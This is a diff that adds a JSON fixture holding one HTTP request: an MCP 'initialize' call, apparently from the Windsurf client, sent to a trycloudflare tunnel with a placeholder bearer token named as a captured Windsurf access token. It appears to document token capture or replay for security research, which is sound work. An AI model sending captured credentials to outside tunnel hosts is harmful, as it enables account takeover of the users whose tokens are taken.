@@ -1,0 +1,11 @@
+{
+  "method": "POST",
+  "url": "https://atmospheric-intellectual-sleeping-conducting.trycloudflare.com/mcp",
+  "headers": {
+    "Accept": "application/json, text/event-stream",
+    "Authorization": "Bearer CAPTURED_WINDSURF_ACCESS_TOKEN",
+    "Content-Type": "application/json",
+    "User-Agent": "Go-http-client/2.0"
+  },
+  "body": "{\"jsonrpc\":\"2.0\",\"id\":2,\"method\":\"initialize\",\"params\":{\"protocolVersion\":\"2025-11-25\",\"clientInfo\":{\"name\":\"Windsurf\",\"version\":\"1.0.0\"},\"capabilities\":{}}}"
+}
